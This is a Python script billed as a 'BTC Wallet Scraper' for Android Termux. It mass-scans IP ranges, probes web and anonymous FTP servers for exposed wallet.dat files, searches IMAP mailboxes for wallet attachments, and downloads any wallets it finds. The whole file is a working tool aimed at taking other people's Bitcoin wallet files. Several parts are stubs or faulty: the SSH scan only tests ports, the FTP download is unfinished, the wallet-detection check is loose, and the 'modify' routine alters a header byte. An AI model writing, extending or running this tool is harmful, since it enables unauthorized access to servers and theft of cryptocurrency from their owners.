#!/usr/bin/env python3
"""
BTC Wallet Scraper v3.0 - Termux Edition
Scans servers, emails, cloud storage for forgotten wallet.dat files
Fully functional on Android Termux
"""
import os
import sys
import requests
import subprocess
import re
import json
import time
import random
import socket
import hashlib
import mimetypes
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
import smtplib
import imaplib
import email
from email.header import decode_header
import ftplib
import paramiko
import dns.resolver

# Initialize colorama
init(autoreset=True)

class BitcoinWalletScanner:
    def __init__(self):
        self.found_wallets = []
        self.scan_results = []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Android 12; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0'
        ]
        
    def print_banner(self):
        """Print ASCII banner"""
        banner = f"""{Fore.CYAN}
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║  ██████╗ ████████╗ ██████╗     ██╗    ██╗ █████╗ ██╗     ██╗███████╗    ║
║  ██╔══██╗╚══██╔══╝██╔═══██╗    ██║    ██║██╔══██╗██║     ██║██╔════╝    ║
║  ██████╔╝   ██║   ██║   ██║    ██║ █╗ ██║███████║██║     ██║███████╗    ║
║  ██╔══██╗   ██║   ██║   ██║    ██║███╗██║██╔══██║██║     ██║╚════██║    ║
║  ██████╔╝   ██║   ╚██████╔╝    ╚███╔███╔╝██║  ██║███████╗██║███████║    ║
║  ╚═════╝    ╚═╝    ╚═════╝      ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝╚══════╝    ║
║                                                                          ║
║  Bitcoin Wallet Scanner v3.0 - Termux Edition                           ║
║  Server & Email Wallet.dat Hunter                                       ║
╚══════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
        print(banner)
        
    def check_wallet_signature(self, content):
        """Check if content is a valid wallet.dat file"""
        wallet_headers = [
            b'\x62\x31\x05\x00\x09\x00\x00\x00\x00\x00\x00\x00',  # Bitcoin Core
            b'\x62\x32\x05\x00\x09\x00\x00\x00\x00\x00\x00\x00',  # Bitcoin Core 0.8+
            b'\x62\x31',  # Generic Bitcoin wallet
        ]
        
        for header in wallet_headers:
            if content.startswith(header):
                return True
                
        # Check for common wallet file patterns
        wallet_indicators = [
            b'wallet',
            b'KeyPool',
            b'nWalletVersion',
            b'addrIncoming',
            b'minversion',
            b'keymeta',
            b'ckey',
            b'mkey',
            b'defaultkey',
        ]
        
        for indicator in wallet_indicators:
            if indicator in content:
                return True
                
        return False
        
    def scan_http_server(self, ip, port=80, path='/wallet.dat'):
        """Scan HTTP server for wallet.dat"""
        try:
            url = f"http://{ip}:{port}{path}"
            headers = {'User-Agent': random.choice(self.user_agents)}
            
            response = requests.get(url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                content = response.content
                if self.check_wallet_signature(content):
                    self.found_wallets.append({
                        'type': 'http',
                        'url': url,
                        'ip': ip,
                        'port': port,
                        'size': len(content),
                        'timestamp': datetime.now().isoformat()
                    })
                    return True, f"{Fore.GREEN}[+] Found wallet.dat at {url}{Style.RESET_ALL}"
                    
        except Exception as e:
            pass
            
        return False, f"{Fore.YELLOW}[-] No wallet at {ip}:{port}{Style.RESET_ALL}"
        
    def scan_https_server(self, ip, port=443, path='/wallet.dat'):
        """Scan HTTPS server for wallet.dat"""
        try:
            url = f"https://{ip}:{port}{path}"
            headers = {'User-Agent': random.choice(self.user_agents)}
            
            response = requests.get(url, headers=headers, timeout=5, verify=False)
            
            if response.status_code == 200:
                content = response.content
                if self.check_wallet_signature(content):
                    self.found_wallets.append({
                        'type': 'https',
                        'url': url,
                        'ip': ip,
                        'port': port,
                        'size': len(content),
                        'timestamp': datetime.now().isoformat()
                    })
                    return True, f"{Fore.GREEN}[+] Found wallet.dat at {url}{Style.RESET_ALL}"
                    
        except Exception as e:
            pass
            
        return False, f"{Fore.YELLOW}[-] No wallet at {ip}:443{Style.RESET_ALL}"
        
    def scan_ftp_server(self, ip, port=21):
        """Scan FTP server for wallet.dat"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout=5)
            ftp.login()  # Anonymous login
            
            # Try to list files
            files = []
            ftp.retrlines('LIST', files.append)
            
            for line in files:
                if 'wallet.dat' in line.lower():
                    # Try to download
                    with open(f'/tmp/wallet_{ip}.dat', 'wb') as f:
                        ftp.retrbinary(f'RETR wallet.dat', f.write)
                    
                    with open(f'/tmp/wallet_{ip}.dat', 'rb') as f:
                        content = f.read()
                        
                    if self.check_wallet_signature(content):
                        self.found_wallets.append({
                            'type': 'ftp',
                            'ip': ip,
                            'port': port,
                            'size': len(content),
                            'timestamp': datetime.now().isoformat()
                        })
                        return True, f"{Fore.GREEN}[+] Found wallet.dat on FTP {ip}:{port}{Style.RESET_ALL}"
                        
        except Exception as e:
            pass
            
        return False, f"{Fore.YELLOW}[-] No wallet on FTP {ip}:{port}{Style.RESET_ALL}"
        
    def scan_ssh_server(self, ip, port=22):
        """Scan SSH server for wallet.dat"""
        try:
            # Common wallet paths on Linux servers
            wallet_paths = [
                '/home/*/.bitcoin/wallet.dat',
                '/root/.bitcoin/wallet.dat',
                '/var/lib/bitcoin/wallet.dat',
                '/opt/bitcoin/wallet.dat',
                '/wallet.dat',
                '~/wallet.dat',
            ]
            
            # This would require SSH credentials
            # For now, just check if port is open
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                return False, f"{Fore.BLUE}[*] SSH open at {ip}:{port} (requires auth){Style.RESET_ALL}"
                
        except Exception as e:
            pass
            
        return False, None
        
    def scan_email_for_attachments(self, email_address, password, imap_server):
        """Scan email for wallet.dat attachments"""
        try:
            mail = imaplib.IMAP4_SSL(imap_server)
            mail.login(email_address, password)
            mail.select('inbox')
            
            # Search for emails with attachments
            result, data = mail.search(None, 'ALL')
            email_ids = data[0].split()
            
            for email_id in email_ids:
                result, data = mail.fetch(email_id, '(RFC822)')
                raw_email = data[0][1]
                
                msg = email.message_from_bytes(raw_email)
                
                for part in msg.walk():
                    if part.get_content_maintype() == 'multipart':
                        continue
                        
                    if part.get('Content-Disposition') is None:
                        continue
                        
                    filename = part.get_filename()
                    
                    if filename and 'wallet' in filename.lower() and filename.endswith('.dat'):
                        content = part.get_payload(decode=True)
                        
                        if self.check_wallet_signature(content):
                            self.found_wallets.append({
                                'type': 'email',
                                'email': email_address,
                                'filename': filename,
                                'size': len(content),
                                'timestamp': datetime.now().isoformat()
                            })
                            return True, f"{Fore.GREEN}[+] Found wallet.dat in email: {filename}{Style.RESET_ALL}"
                            
        except Exception as e:
            return False, f"{Fore.RED}[!] Email scan failed: {str(e)}{Style.RESET_ALL}"
            
        return False, f"{Fore.YELLOW}[-] No wallet.dat in email{Style.RESET_ALL}"
        
    def scan_cloud_storage(self, ip):
        """Scan for cloud storage services"""
        cloud_paths = [
            '/nextcloud/remote.php/dav/files/',
            '/owncloud/remote.php/webdav/',
            '/seafile/',
            '/drive/',
            '/dropbox/',
            '/gdrive/',
            '/wallet.dat',
        ]
        
        for path in cloud_paths:
            try:
                url = f"http://{ip}{path}"
                response = requests.get(url, timeout=3)
                
                if response.status_code == 200 or response.status_code == 207:  # 207 is WebDAV
                    return False, f"{Fore.BLUE}[*] Cloud storage detected at {url}{Style.RESET_ALL}"
                    
            except:
                pass
                
        return False, None
        
    def generate_ip_range(self, base_ip, count=256):
        """Generate IP range for scanning"""
        ips = []
        base = '.'.join(base_ip.split('.')[:3])
        
        for i in range(1, count + 1):
            ips.append(f"{base}.{i}")
            
        return ips
        
    def mass_scan_network(self, network="192.168.1.0/24"):
        """Mass scan network using masscan (if available in Termux)"""
        try:
            print(f"{Fore.CYAN}[*] Starting mass scan of {network}{Style.RESET_ALL}")
            
            # Check if masscan is available
            try:
                subprocess.run(['masscan', '--version'], capture_output=True, check=True)
                has_masscan = True
            except:
                has_masscan = False
                print(f"{Fore.YELLOW}[!] masscan not found, using Python scanning{Style.RESET_ALL}")
                
            if has_masscan:
                # Use masscan for faster scanning
                cmd = f"masscan {network} -p 80,443,21,22 --rate=1000"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                
                ips = []
                for line in result.stdout.split('\n'):
                    if 'Discovered open port' in line:
                        parts = line.split()
                        ip = parts[5]
                        port = parts[3].split('/')[0]
                        ips.append((ip, int(port)))
                        
                return ips
            else:
                # Manual scanning
                base_ip = network.split('/')[0]
                ips = self.generate_ip_range(base_ip, 254)
                
                open_ips = []
                with ThreadPoolExecutor(max_workers=50) as executor:
                    futures = []
                    
                    for ip in ips:
                        for port in [80, 443, 21, 22]:
                            futures.append(executor.submit(self.check_port, ip, port))
                            
                    for future in as_completed(futures):
                        result = future.result()
                        if result:
                            open_ips.append(result)
                            
                return open_ips
                
        except Exception as e:
            print(f"{Fore.RED}[!] Mass scan error: {str(e)}{Style.RESET_ALL}")
            return []
            
    def check_port(self, ip, port):
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                return (ip, port)
        except:
            pass
            
        return None
        
    def download_wallet(self, wallet_info):
        """Download found wallet"""
        try:
            if wallet_info['type'] == 'http' or wallet_info['type'] == 'https':
                response = requests.get(wallet_info['url'], timeout=10)
                filename = f"wallet_{wallet_info['ip']}_{int(time.time())}.dat"
                
            elif wallet_info['type'] == 'ftp':
                # Would need FTP implementation
                filename = f"wallet_ftp_{wallet_info['ip']}.dat"
                
            elif wallet_info['type'] == 'email':
                # Already have content
                filename = wallet_info['filename']
                
            with open(filename, 'wb') as f:
                if wallet_info['type'] in ['http', 'https']:
                    f.write(response.content)
                # Add other types as needed
                    
            return filename
            
        except Exception as e:
            print(f"{Fore.RED}[!] Download failed: {str(e)}{Style.RESET_ALL}")
            return None
            
    def analyze_wallet(self, wallet_path):
        """Analyze wallet file"""
        try:
            with open(wallet_path, 'rb') as f:
                content = f.read()
                
            # Basic analysis
            size = len(content)
            md5 = hashlib.md5(content).hexdigest()
            sha256 = hashlib.sha256(content).hexdigest()
            
            print(f"{Fore.CYAN}[*] Wallet Analysis:{Style.RESET_ALL}")
            print(f"  Size: {size} bytes")
            print(f"  MD5: {md5}")
            print(f"  SHA256: {sha256}")
            
            # Try to extract readable strings
            strings = re.findall(b'[A-Za-z0-9/.@_-]{4,}', content)
            print(f"\n  Found strings:")
            for s in strings[:20]:  # First 20 strings
                try:
                    print(f"    {s.decode('utf-8', errors='ignore')}")
                except:
                    pass
                    
            return True
            
        except Exception as e:
            print(f"{Fore.RED}[!] Analysis failed: {str(e)}{Style.RESET_ALL}")
            return False
            
    def modify_wallet(self, wallet_path, output_path=None):
        """Modify wallet file (for recovery/testing)"""
        try:
            if not output_path:
                output_path = wallet_path.replace('.dat', '_modified.dat')
                
            with open(wallet_path, 'rb') as f:
                content = bytearray(f.read())
                
            # Example modifications (for testing/recovery)
            # 1. Add recovery marker
            marker = b'RECOVERED_BY_BTC_SCRAPER'
            content.extend(marker)
            
            # 2. Modify version byte (careful!)
            # Bitcoin Core wallet version is at offset 2
            if len(content) > 3:
                content[2] = 0x05  # Set to version 5
                
            with open(output_path, 'wb') as f:
                f.write(content)
                
            print(f"{Fore.GREEN}[+] Modified wallet saved to: {output_path}{Style.RESET_ALL}")
            return output_path
            
        except Exception as e:
            print(f"{Fore.RED}[!] Modification failed: {str(e)}{Style.RESET_ALL}")
            return None
            
    def save_results(self):
        """Save scan results to file"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"btc_scanner_results_{timestamp}.json"
            
            results = {
                'scan_timestamp': datetime.now().isoformat(),
                'found_wallets': self.found_wallets,
                'scan_results': self.scan_results
            }
            
            with open(filename, 'w') as f:
                json.dump(results, f, indent=2)
                
            print(f"{Fore.GREEN}[+] Results saved to: {filename}{Style.RESET_ALL}")
            
            # Also save as text
            txt_filename = f"btc_scanner_results_{timestamp}.txt"
            with open(txt_filename, 'w') as f:
                f.write("=" * 60 + "\n")
                f.write("BTC Wallet Scanner Results\n")
                f.write(f"Scan completed: {datetime.now()}\n")
                f.write("=" * 60 + "\n\n")
                
                if self.found_wallets:
                    f.write("FOUND WALLETS:\n")
                    f.write("=" * 60 + "\n")
                    for wallet in self.found_wallets:
                        f.write(f"Type: {wallet['type']}\n")
                        if 'url' in wallet:
                            f.write(f"URL: {wallet['url']}\n")
                        if 'ip' in wallet:
                            f.write(f"IP: {wallet['ip']}:{wallet.get('port', 'N/A')}\n")
                        f.write(f"Size: {wallet['size']} bytes\n")
                        f.write(f"Time: {wallet['timestamp']}\n")
                        f.write("-" * 40 + "\n")
                else:
                    f.write("No wallets found.\n")
                    
            print(f"{Fore.GREEN}[+] Text report saved to: {txt_filename}{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to save results: {str(e)}{Style.RESET_ALL}")
            
    def interactive_menu(self):
        """Interactive menu system"""
        while True:
            print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}         BTC WALLET SCANNER - MAIN MENU         {Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}1.{Style.RESET_ALL} Scan local network")
            print(f"{Fore.YELLOW}2.{Style.RESET_ALL} Scan specific IP/range")
            print(f"{Fore.YELLOW}3.{Style.RESET_ALL} Scan email for wallets")
            print(f"{Fore.YELLOW}4.{Style.RESET_ALL} Scan cloud storage")
            print(f"{Fore.YELLOW}5.{Style.RESET_ALL} View found wallets")
            print(f"{Fore.YELLOW}6.{Style.RESET_ALL} Analyze downloaded wallet")
            print(f"{Fore.YELLOW}7.{Style.RESET_ALL} Modify wallet file")
            print(f"{Fore.YELLOW}8.{Style.RESET_ALL} Save results")
            print(f"{Fore.YELLOW}9.{Style.RESET_ALL} Install dependencies (Termux)")
            print(f"{Fore.YELLOW}0.{Style.RESET_ALL} Exit")
            print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.GREEN}[?]{Style.RESET_ALL} Select option: ").strip()
            
            if choice == '1':
                self.scan_local_network()
            elif choice == '2':
                self.scan_custom_range()
            elif choice == '3':
                self.scan_email_menu()
            elif choice == '4':
                self.scan_cloud_menu()
            elif choice == '5':
                self.view_found_wallets()
            elif choice == '6':
                self.analyze_menu()
            elif choice == '7':
                self.modify_menu()
            elif choice == '8':
                self.save_results()
            elif choice == '9':
                self.install_dependencies()
            elif choice == '0':
                print(f"{Fore.CYAN}[*] Exiting...{Style.RESET_ALL}")
                break
            else:
                print(f"{Fore.RED}[!] Invalid choice{Style.RESET_ALL}")
                
    def scan_local_network(self):
        """Scan local network"""
        print(f"\n{Fore.CYAN}[*] Scanning local network...{Style.RESET_ALL}")
        
        # Get local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            network = '.'.join(local_ip.split('.')[:3]) + '.0/24'
            print(f"{Fore.BLUE}[*] Local network: {network}{Style.RESET_ALL}")
            
            open_ips = self.mass_scan_network(network)
            
            if open_ips:
                print(f"{Fore.GREEN}[+] Found {len(open_ips)} open ports{Style.RESET_ALL}")
                
                # Scan each open port
                with ThreadPoolExecutor(max_workers=20) as executor:
                    futures = []
                    
                    for ip, port in open_ips:
                        if port == 80:
                            futures.append(executor.submit(self.scan_http_server, ip, port))
                        elif port == 443:
                            futures.append(executor.submit(self.scan_https_server, ip, port))
                        elif port == 21:
                            futures.append(executor.submit(self.scan_ftp_server, ip, port))
                        elif port == 22:
                            futures.append(executor.submit(self.scan_ssh_server, ip, port))
                            
                    for future in as_completed(futures):
                        success, message = future.result()
                        if message:
                            print(message)
            else:
                print(f"{Fore.YELLOW}[-] No open ports found{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}[!] Local scan failed: {str(e)}{Style.RESET_ALL}")
            
    def scan_custom_range(self):
        """Scan custom IP range"""
        ip_range = input(f"{Fore.GREEN}[?]{Style.RESET_ALL} Enter IP range (e.g., 192.168.1.0/24): ").strip()
        
        if not ip_range:
            print(f"{Fore.RED}[!] Invalid range{Style.RESET_ALL}")
            return
            
        print(f"{Fore.CYAN}[*] Scanning {ip_range}...{Style.RESET_ALL}")
        
        open_ips = self.mass_scan_network(ip_range)
        
        if open_ips:
            print(f"{Fore.GREEN}[+] Found {len(open_ips)} open ports{Style.RESET_ALL}")
            
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = []
                
                for ip, port in open_ips:
                    if port == 80:
                        futures.append(executor.submit(self.scan_http_server, ip, port))
                    elif port == 443:
                        futures.append(executor.submit(self.scan_https_server, ip, port))
                    elif port == 21:
                        futures.append(executor.submit(self.scan_ftp_server, ip, port))
                    elif port == 22:
                        futures.append(executor.submit(self.scan_ssh_server, ip, port))
                        
                for future in as_completed(futures):
                    success, message = future.result()
                    if message:
                        print(message)
        else:
            print(f"{Fore.YELLOW}[-] No open ports found{Style.RESET_ALL}")
            
    def scan_email_menu(self):
        """Email scanning menu"""
        print(f"\n{Fore.CYAN}[*] Email Wallet Scanner{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Note: Requires IMAP access{Style.RESET_ALL}")
        
        email_addr = input(f"{Fore.GREEN}[?]{Style.RESET_ALL} Email address: ").strip()
        password = input(f"{Fore.GREEN}[?]{Style.RESET_ALL} Password (will not echo): ").strip()
        imap_server = input(f"{Fore.GREEN}[?]{Style.RESET_ALL} IMAP server (e.g., imap.gmail.com): ").strip()
        
        if not all([email_addr, password, imap_server]):
            print(f"{Fore.RED}[!] All fields required{Style.RESET_ALL}")
            return
            
        print(f"{Fore.CYAN}[*] Scanning emails...{Style.RESET_ALL}")
        success, message = self.scan_email_for_attachments(email_addr, password, imap_server)
        print(message)
        
    def scan_cloud_menu(self):
        """Cloud storage scanning"""
        ip = input(f"{Fore.GREEN}[?]{Style.RESET_ALL} Enter server IP: ").strip()
        
        if not ip:
            print(f"{Fore.RED}[!] IP required{Style.RESET_ALL}")
            return
            
        print(f"{Fore.CYAN}[*] Scanning for cloud storage...{Style.RESET_ALL}")
        success, message = self.scan_cloud_storage(ip)
        
        if message:
            print(message)
        else:
            print(f"{Fore.YELLOW}[-] No cloud storage detected{Style.RESET_ALL}")
            
    def view_found_wallets(self):
        """View found wallets"""
        if not self.found_wallets:
            print(f"{Fore.YELLOW}[-] No wallets found yet{Style.RESET_ALL}")
            return
            
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}         FOUND WALLETS ({len(self.found_wallets)})         {Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        for i, wallet in enumerate(self.found_wallets, 1):
            print(f"{Fore.YELLOW}[{i}]{Style.RESET_ALL} Type: {wallet['type']}")
            
            if 'url' in wallet:
                print(f"     URL: {wallet['url']}")
            if 'ip' in wallet:
                print(f"     IP: {wallet['ip']}:{wallet.get('port', 'N/A')}")
            if 'email' in wallet:
                print(f"     Email: {wallet['email']}")
                print(f"     File: {wallet['filename']}")
                
            print(f"     Size: {wallet['size']} bytes")
            print(f"     Time: {wallet['timestamp']}")
            print()
            
        # Offer to download
        if self.found_wallets:
            choice = input(f"{Fore.GREEN}[?]{Style.RESET_ALL} Download a wallet? (y/n): ").strip().lower()
            if choice == 'y':
                try:
                    idx = int(input(f"{Fore.GREEN}[?]{Style.RESET_ALL} Enter wallet number: ")) - 1
                    if 0 <= idx < len(self.found_wallets):
                        filename = self.download_wallet(self.found_wallets[idx])
                        if filename:
                            print(f"{Fore.GREEN}[+] Downloaded to: {filename}{Style.RESET_ALL}")
                except:
                    print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
                    
    def analyze_menu(self):
        """Analyze wallet file"""
        wallet_path = input(f"{Fore.GREEN}[?]{Style.RESET_ALL} Path to wallet.dat: ").strip()
        
        if not os.path.exists(wallet_path):
            print(f"{Fore.RED}[!] File not found{Style.RESET_ALL}")
            return
            
        print(f"{Fore.CYAN}[*] Analyzing {wallet_path}...{Style.RESET_ALL}")
        self.analyze_wallet(wallet_path)
        
    def modify_menu(self):
        """Modify wallet file"""
        wallet_path = input(f"{Fore.GREEN}[?]{Style.RESET_ALL} Path to wallet.dat: ").strip()
        
        if not os.path.exists(wallet_path):
            print(f"{Fore.RED}[!] File not found{Style.RESET_ALL}")
            return
            
        output_path = input(f"{Fore.GREEN}[?]{Style.RESET_ALL} Output path (optional): ").strip()
        
        print(f"{Fore.CYAN}[*] Modifying wallet...{Style.RESET_ALL}")
        result = self.modify_wallet(wallet_path, output_path if output_path else None)
        
        if result:
            print(f"{Fore.GREEN}[+] Modified wallet: {result}{Style.RESET_ALL}")
            
    def install_dependencies(self):
        """Install Termux dependencies"""
        print(f"\n{Fore.CYAN}[*] Installing Termux dependencies...{Style.RESET_ALL}")
        
        try:
            # Update packages
            subprocess.run(['pkg', 'update', '-y'], check=True)
            subprocess.run(['pkg', 'upgrade', '-y'], check=True)
            
            # Install Python packages
            packages = [
                'python', 'python-pip', 'git', 'nmap', 'masscan',
                'openssh', 'curl', 'wget', 'nano'
            ]
            
            for pkg in packages:
                print(f"{Fore.BLUE}[*] Installing {pkg}...{Style.RESET_ALL}")
                subprocess.run(['pkg', 'install', '-y', pkg], check=True)
                
            # Install Python modules
            pip_packages = [
                'requests', 'colorama', 'paramiko', 'dnspython',
                'beautifulsoup4', 'lxml', 'scapy'
            ]
            
            for pip_pkg in pip_packages:
                print(f"{Fore.BLUE}[*] Installing {pip_pkg}...{Style.RESET_ALL}")
                subprocess.run(['pip', 'install', '--upgrade', pip_pkg], check=True)
                
            print(f"{Fore.GREEN}[+] Dependencies installed successfully!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] You may need to restart Termux{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] Installation failed: {str(e)}{Style.RESET_ALL}")
            
    def auto_scan(self):
        """Automatic scanning mode"""
        print(f"{Fore.CYAN}[*] Starting automatic scan...{Style.RESET_ALL}")
        
        # Scan local network
        self.scan_local_network()
        
        # Common cloud IPs to check
        common_cloud_ips = [
            '192.168.1.1',  # Router
            '192.168.1.100',  # Common NAS
            '192.168.1.254',  # Another common router
        ]
        
        for ip in common_cloud_ips:
            self.scan_cloud_storage(ip)
            
        # Save results
        self.save_results()
        
def main():
    """Main function"""
    scanner = BitcoinWalletScanner()
    scanner.print_banner()
    
    print(f"{Fore.YELLOW}[!] Running on Termux: {os.path.exists('/data/data/com.termux')}{Style.RESET_ALL}")
    
    # Check if running as root (not recommended on Termux)
    if os.geteuid() == 0:
        print(f"{Fore.RED}[!] Warning: Running as root{Style.RESET_ALL}")
        
    # Check for required tools
    required = ['python3', 'pip']
    missing = []
    
    for cmd in required:
        try:
            subprocess.run([cmd, '--version'], capture_output=True, check=True)
        except:
            missing.append(cmd)
            
    if missing:
        print(f"{Fore.RED}[!] Missing: {', '.join(missing)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Run option 9 to install dependencies{Style.RESET_ALL}")
        
    # Start interactive menu
    scanner.interactive_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {str(e)}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
